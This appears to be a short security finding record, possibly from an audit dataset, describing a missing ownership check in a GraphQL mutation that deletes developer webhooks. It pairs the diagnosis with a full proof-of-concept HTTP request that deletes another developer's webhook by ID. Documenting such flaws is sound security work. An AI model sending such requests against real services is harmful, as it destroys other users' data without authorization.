diagnosis: The mutation deletes a DeveloperWebhook based solely on webhook_id without verifying that hook.developer == info.context.user or checking organization membership. Any authenticated developer can delete event webhook listeners registered by other developers.
exploit_request:
POST /graphql/ HTTP/1.1
Host: api.devportal.example
Authorization: Bearer <dev_token>
Content-Type: application/json

{"query": "mutation { deleteDeveloperWebhook(webhookId: 441) { deletedId } }"}
